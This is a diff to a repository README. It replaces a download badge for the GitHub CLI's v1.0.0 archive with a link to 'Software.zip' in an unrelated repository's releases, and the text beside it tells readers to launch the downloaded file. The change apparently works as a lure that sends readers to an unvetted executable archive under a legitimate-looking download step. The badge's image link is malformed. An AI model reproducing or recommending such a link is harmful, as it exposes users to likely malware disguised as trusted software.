@@ -7,7 +7,7 @@ This repository does not provide a specific short description.
 This repository does not provide specific topics.
 
 ## Download
-[![Download Zip](https://img.shields.io/badge/Download%20Zip-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/mado601/www/releases/download/v1.0/Software.zip%https://github.com/mado601/www/releases/download/v1.0/Software.zip)](https://github.com/mado601/www/releases/download/v1.0/Software.zip)
 Click the button above to download the ZIP file for version 1.0.0. Launch the downloaded file to access its contents.
 
 If the download link is not working, please check the "Releases" section of the repository.
